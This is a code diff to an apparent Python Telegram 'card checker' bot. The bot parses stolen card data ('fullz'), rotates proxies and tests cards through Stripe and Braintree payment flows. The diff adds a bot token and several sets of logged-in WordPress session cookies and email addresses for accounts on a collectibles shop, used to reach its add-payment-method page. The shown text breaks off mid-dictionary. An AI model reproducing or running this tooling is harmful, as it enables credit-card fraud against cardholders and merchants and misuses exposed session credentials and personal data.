@@ -2,6 +2,7 @@ import os
 import re
 import time
 import json
+import uuid
 import asyncio
 import base64
 import random
@@ -21,20 +22,24 @@ from telegram.ext import (
 )
 OWNER_ADMIN_ID = 7519839885
 ADMIN_ID_FILE = "admin_ids.txt"
-BOT_TOKEN = "8112017304:AAEI92Ren0UUysK-QTaSaNLBzvvL-wjB3QU"
+BOT_TOKEN = "8112017304:AAEpGTDaaDy57lxQuikwUEGoTeL0mvz93OM"
 ALLOWED_GROUP_IDS = [-1002984425456]
 user_mode = "stripe"
+
 def get_admin_chat_ids() -> set[int]:
     if os.path.exists(ADMIN_ID_FILE):
         with open(ADMIN_ID_FILE, "r") as f:
             return {int(line.strip()) for line in f if line.strip().isdigit()}
     return set()
+
 def save_admin_chat_ids(admins: set[int]) -> None:
     with open(ADMIN_ID_FILE, "w") as f:
         for aid in admins:
             f.write(f"{aid}\n")
+
 admin_chat_ids = get_admin_chat_ids()
 active_mode_per_chat = {}
+
 def gets(s: str, start: str, end: str) -> str | None:
     try:
         start_index = s.index(start) + len(start)
@@ -42,6 +47,7 @@ def gets(s: str, start: str, end: str) -> str | None:
         return s[start_index:end_index]
     except ValueError:
         return None
+
 def validate_expiry_date(mes, ano):
     mes = mes.zfill(2)
     if len(ano) == 4:
@@ -60,6 +66,7 @@ def validate_expiry_date(mes, ano):
     if expiry_year == current_year and expiry_month < current_month:
         return False, "Expiration date invalid"
     return True, ""
+
 def is_valid_credit_card_number(number: str) -> bool:
     number = number.replace(" ", "").replace("-", "")
     if not number.isdigit():
@@ -74,6 +81,7 @@ def is_valid_credit_card_number(number: str) -> bool:
                 n = n - 9
         total += n
     return total % 10 == 0
+
 def parse_fullz(fullz_raw):
     raws = re.split(r"\s+", fullz_raw.strip())
     cleaned = []
@@ -91,6 +99,7 @@ def parse_fullz(fullz_raw):
         full = f"{cc}|{mes}|{ano}|{cvv}"
         cleaned.append(full)
     return cleaned
+
 def load_proxies_from_file(file_path="proxy.txt"):
     proxies = []
     try:
@@ -109,6 +118,7 @@ def load_proxies_from_file(file_path="proxy.txt"):
     except FileNotFoundError:
         proxies = []
     return proxies
+
 def save_proxies_to_file(proxies, file_path="proxy.txt"):
     lines = []
     for p in proxies:
@@ -123,6 +133,7 @@ def save_proxies_to_file(proxies, file_path="proxy.txt"):
         lines.append(line)
     with open(file_path, "w", encoding="utf-8") as f:
         f.write("\n".join(lines))
+
 def get_card_info_from_api(bin_number):
     try:
         url = f"https://drlabapis.onrender.com/api/bin?bin={bin_number}"
@@ -138,6 +149,7 @@ def get_card_info_from_api(bin_number):
     except Exception as e:
         print(f"API call failed: {e}")
     return None
+
 # Helper functions to determine card brand and type
 def get_card_brand(card_number):
     """Determine card brand from card number"""
@@ -168,6 +180,7 @@ def get_card_brand(card_number):
         return "UNIONPAY"
     else:
         return "Unknown"
+
 def get_card_type(card_number):
     """Determine card type from card number"""
     card_number = re.sub(r'\D', '', card_number)
@@ -182,6 +195,7 @@ def get_card_type(card_number):
         return "CREDIT"
     else:
         return "Unknown"
+
 # --- class Stripe, Braintree, dan fungsi utilitas ---
 class StripeAuth:
     @staticmethod
@@ -387,7 +401,7 @@ class StripeAuth:
             elif "pickup_card" in result:
                 return "PICKUP CARD ❌"
             elif "incorrect_number" in result or "card number is incorrect" in result:
-                return "INCORRECT CARD NUMBER ❌"
+                return "INCORRECT NUMBER ❌"
             elif "Your card has expired." in result:
                 return "EXPIRED CARD ❌"
             elif "captcha" in result:
@@ -761,7 +775,293 @@ class StripeCharge:
             msg = await update.message.reply_text(
                 "𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗖𝗡\nSEND CARDS ➯ CC|MM|YY|CVV"
             )
-    
+
+# Cookies untuk Braintree Auth New
+cookies_sets = [
+    {
+        "get": {
+            'sbjs_migrations': '1418474375998%3D1',
+            'sbjs_current_add': 'fd%3D2025-09-13%2000%3A57%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
+            'sbjs_first_add': 'fd%3D2025-09-13%2000%3A57%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
+            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F138.0.0.0%20Safari%2F537.36',
+            '_gcl_au': '1.1.631106738.1757725047',
+            '_ga': 'GA1.1.526833323.1757725047',
+            'Subscribe': 'true',
+            'mailchimp.cart.current_email': 'parael12@gmail.com',
+            'mailchimp_user_email': 'parael12%40gmail.com',
+            'breeze_folder_name': '6bae3cd94ddbfe28435ae88815e64956a5198266',
+            'wordpress_logged_in_9af923add3e33fe261964563a4eb5c9b': 'parael12%7C1758934724%7Cc3DwpZWQKi8jcLnrSN5RXpd4RXUgghQeN0TQ9j99VZh%7C64db051084fd267bea56ccb6d981b8e2fea4d8e26b21553ef6196bf965ad2eb1',
+            'wfwaf-authcookie-428ce1eeac9307d8349369ddc6c2bb5f': '9047%7Cother%7Cread%7C9c93393a187391c38bd9a889ba2f8856356067bbdfa69f9c38c197c6cbf24a38',
+            'dfehc_user': '58f34301986c298e3e6f9509e198c453',
+            '_ga_D1Q49TMJ2C': 'GS2.1.s1757725046$o1$g1$t1757725711$j42$l0$h0',
+            'sbjs_session': 'pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fadd-payment-method%2F',
+        },
+        "post": {
+            'sbjs_migrations': '1418474375998%3D1',
+            'sbjs_current_add': 'fd%3D2025-09-13%2000%3A57%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
+            'sbjs_first_add': 'fd%3D2025-09-13%2000%3A57%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
+            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F138.0.0.0%20Safari%2F537.36',
+            '_gcl_au': '1.1.631106738.1757725047',
+            '_ga': 'GA1.1.526833323.1757725047',
+            'Subscribe': 'true',
+            'mailchimp.cart.current_email': 'parael12@gmail.com',
+            'mailchimp_user_email': 'parael12%40gmail.com',
+            'breeze_folder_name': '6bae3cd94ddbfe28435ae88815e64956a5198266',
+            'wordpress_logged_in_9af923add3e33fe261964563a4eb5c9b': 'parael12%7C1758934724%7Cc3DwpZWQKi8jcLnrSN5RXpd4RXUgghQeN0TQ9j99VZh%7C64db051084fd267bea56ccb6d981b8e2fea4d8e26b21553ef6196bf965ad2eb1',
+            'wfwaf-authcookie-428ce1eeac9307d8349369ddc6c2bb5f': '9047%7Cother%7Cread%7C9c93393a187391c38bd9a889ba2f8856356067bbdfa69f9c38c197c6cbf24a38',
+            'dfehc_user': '58f34301986c298e3e6f9509e198c453',
+            '_ga_D1Q49TMJ2C': 'GS2.1.s1757725046$o1$g1$t1757725732$j21$l0$h0',
+            'sbjs_session': 'pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fadd-payment-method%2F',
+        },
+    },
+    {
+        "get": {
+            'dfehc_user': '10b31e84dbc3edc2a340fdc05d47a2e8',
+            'sbjs_migrations': '1418474375998%3D1',
+            'sbjs_current_add': 'fd%3D2025-09-13%2001%3A15%3A46%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
+            'sbjs_first_add': 'fd%3D2025-09-13%2001%3A15%3A46%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
+            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F138.0.0.0%20Safari%2F537.36',
+            '_gcl_au': '1.1.810170871.1757726147',
+            '_ga': 'GA1.1.1172717675.1757726147',
+            'Subscribe': 'true',
+            'mailchimp.cart.current_email': 'senoman12@gmail.com',
+            'mailchimp_user_email': 'senoman12%40gmail.com',
+            'breeze_folder_name': '6bae3cd94ddbfe28435ae88815e64956a5198266',
+            'wordpress_logged_in_9af923add3e33fe261964563a4eb5c9b': 'senoman12%7C1758935785%7C7AY8rGS5jrnUIpvKnHxlshjq5vZBIkqeomKZXkzad8p%7Cd18eac3d7a232b9e3455c30e2683d6ca376a0fbc96e7e3f581b4137f1997cb54',
+            'wfwaf-authcookie-428ce1eeac9307d8349369ddc6c2bb5f': '9048%7Cother%7Cread%7C1eedf0c4ee442707f1691db05bc049bcc8f13a82aac027fd29a94413f60098f8',
+            'mailchimp.cart.previous_email': 'senoman12@gmail.com',
+            '_ga_D1Q49TMJ2C': 'GS2.1.s1757726147$o1$g1$t1757726257$j26$l0$h0',
+            'sbjs_session': 'pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fadd-payment-method%2F',
+        },
+        "post": {
+            'dfehc_user': '10b31e84dbc3edc2a340fdc05d47a2e8',
+            'sbjs_migrations': '1418474375998%3D1',
+            'sbjs_current_add': 'fd%3D2025-09-13%2001%3A15%3A46%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
+            'sbjs_first_add': 'fd%3D2025-09-13%2001%3A15%3A46%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
+            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F138.0.0.0%20Safari%2F537.36',
+            '_gcl_au': '1.1.810170871.1757726147',
+            '_ga': 'GA1.1.1172717675.1757726147',
+            'Subscribe': 'true',
+            'mailchimp.cart.current_email': 'senoman12@gmail.com',
+            'mailchimp_user_email': 'senoman12%40gmail.com',
+            'breeze_folder_name': '6bae3cd94ddbfe28435ae88815e64956a5198266',
+            'wordpress_logged_in_9af923add3e33fe261964563a4eb5c9b': 'senoman12%7C1758935785%7C7AY8rGS5jrnUIpvKnHxlshjq5vZBIkqeomKZXkzad8p%7Cd18eac3d7a232b9e3455c30e2683d6ca376a0fbc96e7e3f581b4137f1997cb54',
+            'wfwaf-authcookie-428ce1eeac9307d8349369ddc6c2bb5f': '9048%7Cother%7Cread%7C1eedf0c4ee442707f1691db05bc049bcc8f13a82aac027fd29a94413f60098f8',
+            'mailchimp.cart.previous_email': 'senoman12@gmail.com',
+            '_ga_D1Q49TMJ2C': 'GS2.1.s1757726147$o1$g1$t1757726300$j57$l0$h0',
+            'sbjs_session': 'pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fadd-payment-method%2F',
+        },
+    },
+    {
+        "get": {
+            'dfehc_user': 'f16e0b0d2869c77effb44d1a4b1a8396',
+            '_ga': 'GA1.1.2036252047.1757726564',
+            '_gcl_au': '1.1.1062696516.1757726564',
+            'sbjs_migrations': '1418474375998%3D1',
+            'sbjs_current_add': 'fd%3D2025-09-13%2001%3A22%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
+            'sbjs_first_add': 'fd%3D2025-09-13%2001%3A22%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
+            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F138.0.0.0%20Safari%2F537.36',
+            'Subscribe': 'true',
+            'mailchimp.cart.current_email': 'roksanim10@gmail.com',
+            'mailchimp_user_email': 'roksanim10%40gmail.com',
+            'breeze_folder_name': '6bae3cd94ddbfe28435ae88815e64956a5198266',
+            'wordpress_logged_in_9af923add3e33fe261964563a4eb5c9b': 'roksanim10%7C1758936216%7CfCkMnhpMYrGCsLo6IK0w9lQioPDtArxKHLpNHFqQNkC%7Cf70fae20b1792ef80622c724267a6ed7b496ba3856403902d554c28077650480',
+            'wfwaf-authcookie-428ce1eeac9307d8349369ddc6c2bb5f': '9049%7Cother%7Cread%7Cce560da51a68da3f12795ff661b0db1018741e11ca008226303a5b794f14f857',
+            '_ga_D1Q49TMJ2C': 'GS2.1.s1757726564$o1$g1$t1757726663$j21$l0$h0',
+            'sbjs_session': 'pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fadd-payment-method%2F',
+        },
+        "post": {
+            'dfehc_user': 'f16e0b0d2869c77effb44d1a4b1a8396',
+            '_ga': 'GA1.1.2036252047.1757726564',
+            '_gcl_au': '1.1.1062696516.1757726564',
+            'sbjs_migrations': '1418474375998%3D1',
+            'sbjs_current_add': 'fd%3D2025-09-13%2001%3A22%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
+            'sbjs_first_add': 'fd%3D2025-09-13%2001%3A22%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
+            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F138.0.0.0%20Safari%2F537.36',
+            'Subscribe': 'true',
+            'mailchimp.cart.current_email': 'roksanim10@gmail.com',
+            'mailchimp_user_email': 'roksanim10%40gmail.com',
+            'breeze_folder_name': '6bae3cd94ddbfe28435ae88815e64956a5198266',
+            'wordpress_logged_in_9af923add3e33fe261964563a4eb5c9b': 'roksanim10%7C1758936216%7CfCkMnhpMYrGCsLo6IK0w9lQioPDtArxKHLpNHFqQNkC%7Cf70fae20b1792ef80622c724267a6ed7b496ba3856403902d554c28077650480',
+            'wfwaf-authcookie-428ce1eeac9307d8349369ddc6c2bb5f': '9049%7Cother%7Cread%7Cce560da51a68da3f12795ff661b0db1018741e11ca008226303a5b794f14f857',
+            '_ga_D1Q49TMJ2C': 'GS2.1.s1757726564$o1$g1$t1757726681$j3$l0$h0',
+            'sbjs_session': 'pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fadd-payment-method%2F',
+        },
+    },
+    {
+        "get": {
+            'dfehc_user': 'f92c3a85dc37642f100c3476ed065d3c',
+            'sbjs_migrations': '1418474375998%3D1',
+            'sbjs_current_add': 'fd%3D2025-09-13%2001%3A47%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
+            'sbjs_first_add': 'fd%3D2025-09-13%2001%3A47%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
+            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F138.0.0.0%20Safari%2F537.36',
+            '_gcl_au': '1.1.660044988.1757728038',
+            '_ga': 'GA1.1.16485119.1757728038',
+            'Subscribe': 'true',
+            'mailchimp.cart.current_email': 'rondaakim18@gmail.com',
+            'mailchimp_user_email': 'rondaakim18%40gmail.com',
+            'breeze_folder_name': '6bae3cd94ddbfe28435ae88815e64956a5198266',
+            'wordpress_logged_in_9af923add3e33fe261964563a4eb5c9b': 'rondaakim18%7C1758937686%7CLhmqkLbr1rVlkh3LRC2bLqOf87m2tARoTREl2iuMAAo%7C5f773163a89d2e5eae5f4111a9c9abe01912aeef92ba19fda8c035ccaad0c9c8',
+            'wfwaf-authcookie-428ce1eeac9307d8349369ddc6c2bb5f': '9050%7Cother%7Cread%7Caf4848c074c535d5c54db46637b5caae8136e5c3cf39da187a97178a1f8672c5',
+            '_ga_D1Q49TMJ2C': 'GS2.1.s1757728037$o1$g1$t1757728129$j30$l0$h0',
+            'sbjs_session': 'pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fadd-payment-method%2F',
+        },
+        "post": {
+            'dfehc_user': 'f92c3a85dc37642f100c3476ed065d3c',
+            'sbjs_migrations': '1418474375998%3D1',
+            'sbjs_current_add': 'fd%3D2025-09-13%2001%3A47%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
+            'sbjs_first_add': 'fd%3D2025-09-13%2001%3A47%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
+            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F138.0.0.0%20Safari%2F537.36',
+            '_gcl_au': '1.1.660044988.1757728038',
+            '_ga': 'GA1.1.16485119.1757728038',
+            'Subscribe': 'true',
+            'mailchimp.cart.current_email': 'rondaakim18@gmail.com',
+            'mailchimp_user_email': 'rondaakim18%40gmail.com',
+            'breeze_folder_name': '6bae3cd94ddbfe28435ae88815e64956a5198266',
+            'wordpress_logged_in_9af923add3e33fe261964563a4eb5c9b': 'rondaakim18%7C1758937686%7CLhmqkLbr1rVlkh3LRC2bLqOf87m2tARoTREl2iuMAAo%7C5f773163a89d2e5eae5f4111a9c9abe01912aeef92ba19fda8c035ccaad0c9c8',
+            'wfwaf-authcookie-428ce1eeac9307d8349369ddc6c2bb5f': '9050%7Cother%7Cread%7Caf4848c074c535d5c54db46637b5caae8136e5c3cf39da187a97178a1f8672c5',
+            '_ga_D1Q49TMJ2C': 'GS2.1.s1757728037$o1$g1$t1757728161$j58$l0$h0',
+            'sbjs_session': 'pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fadd-payment-method%2F',
+        },
+    },
+    {
+        "get": {
+            'dfehc_user': 'a7c3c50e219cb300e1b97d1fe7c425f8',
+            'sbjs_migrations': '1418474375998%3D1',
+            'sbjs_current_add': 'fd%3D2025-09-13%2001%3A52%3A07%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
+            'sbjs_first_add': 'fd%3D2025-09-13%2001%3A52%3A07%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
+            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F138.0.0.0%20Safari%2F537.36',
+            '_ga': 'GA1.1.169487154.1757728328',
+            '_gcl_au': '1.1.1129995764.1757728328',
+            'Subscribe': 'true',
+            'mailchimp.cart.current_email': 'Paraohkam45@gmail.com',
+            'mailchimp_user_email': 'Paraohkam45%40gmail.com',
+            'breeze_folder_name': '6bae3cd94ddbfe28435ae88815e64956a5198266',
+            'wordpress_logged_in_9af923add3e33fe261964563a4eb5c9b': 'paraohkam45%7C1758937962%7COqdOVmMNcXnj0F7irnCvDOTf0Iqt6itT1OrChKN6xyb%7C5358b8e41f5c14f7f751198aa378010971c8146a5aa4dc853037d6f7a1c44c94',
+            'wfwaf-authcookie-428ce1eeac9307d8349369ddc6c2bb5f': '9051%7Cother%7Cread%7C0162e0ab07146892b17f052c4e597810d0a2e901ef76359fdc7d5f7761c07bdd',
+            '_ga_D1Q49TMJ2C': 'GS2.1.s1757728327$o1$g1$t1757728409$j49$l0$h0',
+            'sbjs_session': 'pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fadd-payment-method%2F',
+        },
+        "post": {
+            'dfehc_user': 'a7c3c50e219cb300e1b97d1fe7c425f8',
+            'sbjs_migrations': '1418474375998%3D1',
+            'sbjs_current_add': 'fd%3D2025-09-13%2001%3A52%3A07%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
+            'sbjs_first_add': 'fd%3D2025-09-13%2001%3A52%3A07%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
+            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
